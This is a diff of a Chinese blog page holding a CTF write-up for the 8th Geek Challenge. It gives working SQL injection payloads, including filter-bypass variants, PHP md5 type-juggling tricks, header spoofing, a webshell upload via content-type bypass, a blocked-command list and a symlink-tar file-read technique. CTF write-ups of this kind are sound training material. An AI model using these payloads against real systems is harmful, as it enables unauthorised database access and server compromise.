@@ -71,13 +71,13 @@
 
 
 
-<meta name="description" content="0x01 故道白云第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注12sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;quot; --dbssqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;qu">
+<meta name="description" content="0x01 故道白云第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注 sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;quot; --dbs sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;qu">
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第八季极客大挑战wp">
-<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/第八季极客大挑战wp/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/11/10/第八季极客大挑战wp/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="0x01 故道白云第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注12sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;quot; --dbssqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;qu">
+<meta property="og:description" content="0x01 故道白云第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注 sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;quot; --dbs sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;qu">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/o2av498esal9p6xninrfyixef8.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/8x8r18tqtnnj01bnltk373x22z.png">
@@ -91,10 +91,10 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/7mp4ksjoklc8fmhtace4t857js.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/222ku2asfez5mhbn3pancbjiqk.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/aknu78dihxj0durpbkjthex3l3.png">
-<meta property="og:updated_time" content="2018-11-10T09:12:33.668Z">
+<meta property="og:updated_time" content="2020-02-26T10:40:21.976Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第八季极客大挑战wp">
-<meta name="twitter:description" content="0x01 故道白云第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注12sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;quot; --dbssqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;qu">
+<meta name="twitter:description" content="0x01 故道白云第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注 sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;quot; --dbs sqlmap -u &amp;quot;http://game.sycsec.com:2006/?id=1&amp;amp;submit=submit&amp;qu">
 <meta name="twitter:image" content="http://img.cdn.cuittk.cn/o2av498esal9p6xninrfyixef8.png">
 
 
@@ -125,12 +125,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/第八季极客大挑战wp/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/11/10/第八季极客大挑战wp/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>第八季极客大挑战wp | h1tler's blog</title>
   
 
@@ -268,7 +268,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/第八季极客大挑战wp/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/11/10/第八季极客大挑战wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -362,36 +362,104 @@
       
 
       
-        <h3 id="0x01-故道白云"><a href="#0x01-故道白云" class="headerlink" title="0x01 故道白云"></a>0x01 故道白云</h3><p>第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap -u &quot;http://game.sycsec.com:2006/?id=1&amp;submit=submit&quot; --dbs</div><div class="line">sqlmap -u &quot;http://game.sycsec.com:2006/?id=1&amp;submit=submit&quot; --D f1ag</div></pre></td></tr></table></figure></p>
-<p><img src="http://img.cdn.cuittk.cn/o2av498esal9p6xninrfyixef8.png" alt=""><br>手注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">id=1&apos; and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,5%23&amp;submit=submit</div><div class="line">id=1&apos;and 1=2 union select 1,table_name from information_schema.tables where table_schema=&apos;f1ag&apos;%23&amp;submit=submit</div><div class="line">id=1&apos;and 1=2 union select 1,column_name from information_schema.columns where table_name=&apos;flag&apos; limit 0,1%23&amp;submit=submit</div><div class="line">id=1&apos;and 1=2 union select 1,f4ag from f1ag.flag%23&amp;submit=submit</div></pre></td></tr></table></figure></p>
+        <h3 id="0x01-故道白云"><a href="#0x01-故道白云" class="headerlink" title="0x01 故道白云"></a>0x01 故道白云</h3><p>第一道题，sql注入入门题，没有过滤，可以使用sqlmap跑出来,也可以使用手注</p>
+<pre><code class="language-html">sqlmap -u &quot;http://game.sycsec.com:2006/?id=1&amp;submit=submit&quot; --dbs
+sqlmap -u &quot;http://game.sycsec.com:2006/?id=1&amp;submit=submit&quot; --D f1ag
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/o2av498esal9p6xninrfyixef8.png" alt=""><br>手注</p>
+<pre><code class="language-html">id=1&#39; and 1=2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 1,5%23&amp;submit=submit
+id=1&#39;and 1=2 union select 1,table_name from information_schema.tables where table_schema=&#39;f1ag&#39;%23&amp;submit=submit
+id=1&#39;and 1=2 union select 1,column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1%23&amp;submit=submit
+id=1&#39;and 1=2 union select 1,f4ag from f1ag.flag%23&amp;submit=submit
+</code></pre>
 <h3 id="0x02-粗心的李超"><a href="#0x02-粗心的李超" class="headerlink" title="0x02 粗心的李超"></a>0x02 粗心的李超</h3><p>备份文件泄露，index.php.bak<br><img src="http://img.cdn.cuittk.cn/8x8r18tqtnnj01bnltk373x22z.png" alt=""><br>flag:SYC{just_brute_is_ok!}</p>
 <h3 id="0x03-Buy-me-a-Tesla"><a href="#0x03-Buy-me-a-Tesla" class="headerlink" title="0x03 Buy me a Tesla"></a>0x03 Buy me a Tesla</h3><p>提交3个表单<br><img src="http://img.cdn.cuittk.cn/tm1sifzra01thopqq4t4lv6g8p.png" alt=""><br>最后一个表单的value值 base64解码三次<br><img src="http://img.cdn.cuittk.cn/8s278k3kcutmx3bkn2b8ua61j1.png" alt=""><br>将yue:10改为1602500 ，base64编码三次，name为yue的value也改为1602500 提交<br><img src="http://img.cdn.cuittk.cn/f214vfo4ztfn7ofveaqewfk495.png" alt=""></p>
-<h3 id="0x04-PHP的悖论1"><a href="#0x04-PHP的悖论1" class="headerlink" title="0x04 PHP的悖论1"></a>0x04 PHP的悖论1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if ($_POST[&apos;s1&apos;] !== $_POST[&apos;s2&apos;] &amp;&amp; md5($_POST[&apos;s1&apos;]) === md5($_POST[&apos;s2&apos;])) &#123; echo $flag; &#125;</div></pre></td></tr></table></figure>
-<p>‘===’是全等于符号，不仅值要求相同而且类型也要相同，但是php的md5函数无法处理数组，遇到数组会返回NULL，因此传数组上去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s1[]=1&amp;s2[]=2</div></pre></td></tr></table></figure></p>
+<h3 id="0x04-PHP的悖论1"><a href="#0x04-PHP的悖论1" class="headerlink" title="0x04 PHP的悖论1"></a>0x04 PHP的悖论1</h3><pre><code class="language-php"> if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) === md5($_POST[&#39;s2&#39;])) { echo $flag; }
+</code></pre>
+<p>‘===’是全等于符号，不仅值要求相同而且类型也要相同，但是php的md5函数无法处理数组，遇到数组会返回NULL，因此传数组上去</p>
+<pre><code class="language-html">s1[]=1&amp;s2[]=2
+</code></pre>
 <p>flag:SYC{Th3_b33t_l4n_1nth3w0rld!!!}</p>
-<h3 id="0x05-PHP的悖论2"><a href="#0x05-PHP的悖论2" class="headerlink" title="0x05 PHP的悖论2"></a>0x05 PHP的悖论2</h3><p>提示上次的方法不能用，因此用php的一个特性–隐式转换，’==’判断的时候，会把字符类型的数字转换成数字。<br>只要在e之前的是纯0，并且e之后的是纯数字，PHP就会当成科学记数法来处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(&quot;0e321&quot; == &quot;00e123&quot;);//bool(true)</div></pre></td></tr></table></figure></p>
-<p>只有md5是0e开头。后面纯数字的情况才会把字符串转成科学计数法，0的N次方=0<br>脚本跑满足条件的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf8 -*-</div><div class="line">import hashlib</div><div class="line"></div><div class="line">payload =&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</div><div class="line">#payload = &quot;qwertyuiopasdfghjklzxcvbnm&quot;</div><div class="line">#payload = &quot;0123456789&quot;</div><div class="line"></div><div class="line">def calcMd5(s):</div><div class="line">	MD5 = hashlib.md5(s.encode()).hexdigest()</div><div class="line">	if MD5[0:2] == &quot;0e&quot; and MD5[2:32].isdigit():</div><div class="line">		print(s, MD5)</div><div class="line"></div><div class="line">def getStr(payload, s, slen):</div><div class="line">	if len(s) == slen:</div><div class="line">		calcMd5(s)</div><div class="line">		return s</div><div class="line">	for j in range(len(payload)):</div><div class="line">		sl = s + payload[j]</div><div class="line">		getStr(payload, sl, slen)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">	print &quot;go&quot;</div><div class="line">	getStr(payload, &apos;&apos;, 7)</div></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">md5(&apos;240610708&apos;) //0e462097431906509019562988736854</div><div class="line">md5(&apos;QNKCDZO&apos;) //0e830400451993494058024219903391</div></pre></td></tr></table></figure>
+<h3 id="0x05-PHP的悖论2"><a href="#0x05-PHP的悖论2" class="headerlink" title="0x05 PHP的悖论2"></a>0x05 PHP的悖论2</h3><p>提示上次的方法不能用，因此用php的一个特性–隐式转换，’==’判断的时候，会把字符类型的数字转换成数字。<br>只要在e之前的是纯0，并且e之后的是纯数字，PHP就会当成科学记数法来处理</p>
+<pre><code class="language-php">var_dump(&quot;0e321&quot; == &quot;00e123&quot;);//bool(true)
+</code></pre>
+<p>只有md5是0e开头。后面纯数字的情况才会把字符串转成科学计数法，0的N次方=0<br>脚本跑满足条件的</p>
+<pre><code class="language-python"># -*- coding: utf8 -*-
+import hashlib
+
+payload =&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;
+#payload = &quot;qwertyuiopasdfghjklzxcvbnm&quot;
+#payload = &quot;0123456789&quot;
+
+def calcMd5(s):
+    MD5 = hashlib.md5(s.encode()).hexdigest()
+    if MD5[0:2] == &quot;0e&quot; and MD5[2:32].isdigit():
+        print(s, MD5)
+
+def getStr(payload, s, slen):
+    if len(s) == slen:
+        calcMd5(s)
+        return s
+    for j in range(len(payload)):
+        sl = s + payload[j]
+        getStr(payload, sl, slen)
+
+if __name__ == &#39;__main__&#39;:
+    print &quot;go&quot;
+    getStr(payload, &#39;&#39;, 7)
+</code></pre>
+<pre><code class="language-html">md5(&#39;240610708&#39;) //0e462097431906509019562988736854
+md5(&#39;QNKCDZO&#39;) //0e830400451993494058024219903391
+</code></pre>
 <p>flag:SYC{Y0u_g0th3w4y_to_k111==}</p>
 <h3 id="006-视频播放器"><a href="#006-视频播放器" class="headerlink" title="006 视频播放器"></a>006 视频播放器</h3><p>当时没做出来</p>
-<h3 id="007-iPhone-X"><a href="#007-iPhone-X" class="headerlink" title="007 iPhone X"></a>007 iPhone X</h3><p>只有iPhone X 能访问，header有一个传递设备信息的user-agent字段，<br>构造iphone X的 user-agent<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1</div></pre></td></tr></table></figure></p>
+<h3 id="007-iPhone-X"><a href="#007-iPhone-X" class="headerlink" title="007 iPhone X"></a>007 iPhone X</h3><p>只有iPhone X 能访问，header有一个传递设备信息的user-agent字段，<br>构造iphone X的 user-agent</p>
+<pre><code class="language-html">Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1
+</code></pre>
 <p>构造请求后返回：ip address not valid<br>修改ip<br>chrome 扩展程序ModHeader<br><img src="http://img.cdn.cuittk.cn/ulaz67cpzcn89e7v8cmmk8o2pr.png" alt=""><br>flag:SYC{UA_AND_IP_COULD_BE<em>FORGED</em>!!!}</p>
-<h3 id="008-Clound的错误"><a href="#008-Clound的错误" class="headerlink" title="008 Clound的错误"></a>008 Clound的错误</h3><p>右键看源代码，根据提示是报错注入，注入点为sycid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sycid=1&apos;and extractvalue(1,concat(0x5c,(select user())))%23</div><div class="line">sycid=1&apos;and extractvalue(1,concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)))%23</div><div class="line">sycid=1&apos;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;f1ag&apos;)))%23</div><div class="line">sycid=1&apos;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;flag&apos; limit 0,1)))%23</div><div class="line">sycid=1&apos;and extractvalue(1,concat(0x7e,(select f4ag from f1ag.flag)))%23</div></pre></td></tr></table></figure></p>
+<h3 id="008-Clound的错误"><a href="#008-Clound的错误" class="headerlink" title="008 Clound的错误"></a>008 Clound的错误</h3><p>右键看源代码，根据提示是报错注入，注入点为sycid</p>
+<pre><code class="language-html">sycid=1&#39;and extractvalue(1,concat(0x5c,(select user())))%23
+sycid=1&#39;and extractvalue(1,concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)))%23
+sycid=1&#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;f1ag&#39;)))%23
+sycid=1&#39;and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1)))%23
+sycid=1&#39;and extractvalue(1,concat(0x7e,(select f4ag from f1ag.flag)))%23
+</code></pre>
 <p>flag:SYC{Err0r_sql_inj}</p>
 <h3 id="0x09-G胖万岁"><a href="#0x09-G胖万岁" class="headerlink" title="0x09 G胖万岁"></a>0x09 G胖万岁</h3><p>当时没做出来</p>
-<h3 id="0x10-Clound的错误2"><a href="#0x10-Clound的错误2" class="headerlink" title="0x10 Clound的错误2"></a>0x10 Clound的错误2</h3><p>过滤了空格用%a0绕过，过滤了注释用;%00绕过<br>过滤了or使用oorr绕过,过滤的其他关键词使用+绕过whe+re<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sycid=1&apos;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(SCHEMA_NAME)%a0fr+om%a0infoorrmation_schema.SCHEMATA)),0x7e));%00</div><div class="line">sycid=1&apos;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(table_name)%a0fr+om%a0infoorrmation_schema.tables%a0whe+re%a0table_schema=&apos;f1ag&apos;)),0x7e));%00</div><div class="line">sycid=1&apos;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0column_name%a0fr+om%a0infoorrmation_schema.columns%a0whe+re%a0table_name=&apos;flag&apos;%a0limit%a00,1)),0x7e));%00</div><div class="line">sycid=1&apos;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0f4ag%a0fr+om%a0f1ag.flag)),0x7e));%00</div></pre></td></tr></table></figure></p>
+<h3 id="0x10-Clound的错误2"><a href="#0x10-Clound的错误2" class="headerlink" title="0x10 Clound的错误2"></a>0x10 Clound的错误2</h3><p>过滤了空格用%a0绕过，过滤了注释用;%00绕过<br>过滤了or使用oorr绕过,过滤的其他关键词使用+绕过whe+re</p>
+<pre><code class="language-html">sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(SCHEMA_NAME)%a0fr+om%a0infoorrmation_schema.SCHEMATA)),0x7e));%00
+sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(table_name)%a0fr+om%a0infoorrmation_schema.tables%a0whe+re%a0table_schema=&#39;f1ag&#39;)),0x7e));%00
+sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0column_name%a0fr+om%a0infoorrmation_schema.columns%a0whe+re%a0table_name=&#39;flag&#39;%a0limit%a00,1)),0x7e));%00
+sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0f4ag%a0fr+om%a0f1ag.flag)),0x7e));%00
+</code></pre>
 <p>flag:SYC{Err0R_sQl_inj2}</p>
 <h3 id="0x11-大大的标题"><a href="#0x11-大大的标题" class="headerlink" title="0x11 大大的标题"></a>0x11 大大的标题</h3><p>文件上传,服务器端只判断了content-type，上传包含一句话木马的.jpg文件<br>burp抓包修改文件名<br><img src="http://img.cdn.cuittk.cn/c2rny8er1qncdj70vepes960f6.png" alt=""><br>flag:SYC{CLound-upL0ad}</p>
-<h3 id="0x12-你的名字"><a href="#0x12-你的名字" class="headerlink" title="0x12 你的名字"></a>0x12 你的名字</h3><h4 id="没有输入入口-测试-name-11-根据返回11-判断是命令执行漏洞"><a href="#没有输入入口-测试-name-11-根据返回11-判断是命令执行漏洞" class="headerlink" title="没有输入入口,测试/?name=11 根据返回11,判断是命令执行漏洞"></a>没有输入入口,测试/?name=11 根据返回11,判断是命令执行漏洞</h4><p>使用burp的intruder功能fuzz过滤的字符，这里使用cluster bomb模式fuzz所有urlencode字符。<br>但是我是一个一个测试出来的：<br>过滤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">! ? @ ls cat ll %0d 空格 %20 echo ` \ ( ) * - + ~ / [ ] &#123; &#125; | &lt; &gt; . ; : &quot; &apos; cd % vi tac more less head tail nl tailf dir php sed grep find locate</div></pre></td></tr></table></figure></p>
-<p>没过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># %0a &amp; String Curl env whoami pwd wc set man df date file</div></pre></td></tr></table></figure></p>
+<h3 id="0x12-你的名字"><a href="#0x12-你的名字" class="headerlink" title="0x12 你的名字"></a>0x12 你的名字</h3><h4 id="没有输入入口-测试-name-11-根据返回11-判断是命令执行漏洞"><a href="#没有输入入口-测试-name-11-根据返回11-判断是命令执行漏洞" class="headerlink" title="没有输入入口,测试/?name=11 根据返回11,判断是命令执行漏洞"></a>没有输入入口,测试/?name=11 根据返回11,判断是命令执行漏洞</h4><p>使用burp的intruder功能fuzz过滤的字符，这里使用cluster bomb模式fuzz所有urlencode字符。<br>但是我是一个一个测试出来的：<br>过滤了</p>
+<pre><code class="language-html">! ? @ ls cat ll %0d 空格 %20 echo ` \ ( ) * - + ~ / [ ] { } | &lt; &gt; . ; : &quot; &#39; cd % vi tac more less head tail nl tailf dir php sed grep find locate
+</code></pre>
+<p>没过滤</p>
+<pre><code class="language-html"># %0a &amp; String Curl env whoami pwd wc set man df date file
+</code></pre>
 <p>绕过空格过滤 %09<br>总体来说，过滤大多数的符号，能使用的就只有%09 %0a（换行符）,只能使用英文拼凑 linux命令</p>
 <p>能使用一些命令，但是并没多大用处:pwd,ss,ifconfig,env<br>这里利用du来查看文件和目录磁盘使用情况来查看目录有哪些文件。<br><img src="http://img.cdn.cuittk.cn/5i6jtegf9x315yjz0vg4fyg7ou.png" alt=""><br>index.php文件大小为 4<br>使用sort命令查看index.php<br><img src="http://img.cdn.cuittk.cn/2mew9qp00pzgdjaohjs1aei885.png" alt=""><br>flag被藏起来了，说明是隐藏文件，查看当前目录，大小为20<br><img src="http://img.cdn.cuittk.cn/7mp4ksjoklc8fmhtace4t857js.png" alt=""><br>使用du命令爆破一下，<br><img src="http://img.cdn.cuittk.cn/222ku2asfez5mhbn3pancbjiqk.png" alt=""><br>.swp文件，使用linux vi命令还原一下<br>vi -r filename<br><img src="http://img.cdn.cuittk.cn/aknu78dihxj0durpbkjthex3l3.png" alt=""><br>flag:SYC{Wo_ai_he_kou_jue_jiu}</p>
-<h4 id="本题所涉及到的linux知识："><a href="#本题所涉及到的linux知识：" class="headerlink" title="本题所涉及到的linux知识："></a>本题所涉及到的linux知识：</h4><p>sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[rocrocket@rocrocket programming]$ cat seq.txt</div><div class="line">banana</div><div class="line">apple</div><div class="line">pear</div><div class="line">orange</div><div class="line">[rocrocket@rocrocket programming]$ sort seq.txt</div><div class="line">apple</div><div class="line">banana</div><div class="line">orange</div><div class="line">pear</div></pre></td></tr></table></figure></p>
+<h4 id="本题所涉及到的linux知识："><a href="#本题所涉及到的linux知识：" class="headerlink" title="本题所涉及到的linux知识："></a>本题所涉及到的linux知识：</h4><p>sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
+<pre><code class="language-html">[rocrocket@rocrocket programming]$ cat seq.txt
+banana
+apple
+pear
+orange
+[rocrocket@rocrocket programming]$ sort seq.txt
+apple
+banana
+orange
+pear
+</code></pre>
 <p>sort index.???<br>linux du 命令<br>Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的.<br>du ?????</p>
 <h3 id="0x13-快捷方式的妙用"><a href="#0x13-快捷方式的妙用" class="headerlink" title="0x13 快捷方式的妙用"></a>0x13 快捷方式的妙用</h3><p>提示上传rar文件，在rar文件内部里添加php代码，将php文件打包成zip,改为tar，这些都不行。<br>本地正好有个linux安装php文件pip-9.0.1.tar.gz上传上去，发现经过解压，并且以文本的形式打印压缩包里的内容。尝试将php文件在linux里打包成tar.gz,上传后php代码被当成文本解析，被注释了。<br>后看了大佬的wp，如下：<br>这里有一篇法文文章，给出了类似的源码和方式<br><a href="https://typeofweb.com/2017/10/17/symlink-zip-upload-plikow-dla-hackera" target="_blank" rel="external">https://typeofweb.com/2017/10/17/symlink-zip-upload-plikow-dla-hackera</a><br>facebook出过类似漏洞<br><a href="http://josipfranjkovic.blogspot.jp/2014/12/reading-local-files-from-facebooks.html" target="_blank" rel="external">http://josipfranjkovic.blogspot.jp/2014/12/reading-local-files-from-facebooks.html</a> (需翻墙)<br>使用以下命令生成利用的上传文件查看源码</p>
-<pre><code>ln -s /var/www/html/upload.php link
+<pre><code class="language-html">ln -s /var/www/html/upload.php link
 tar -zcvf daedalus.tar.gz link
-</code></pre><p>然后源码会提示flag在home目录下，利用同样方式读得flag(写writeup时题目无法打开了，所以没有flag……)</p>
+</code></pre>
+<p>然后源码会提示flag在home目录下，利用同样方式读得flag(写writeup时题目无法打开了，所以没有flag……)</p>
 
       
     </div>
@@ -516,7 +584,7 @@ tar -zcvf daedalus.tar.gz link
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -644,7 +712,7 @@ tar -zcvf daedalus.tar.gz link
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
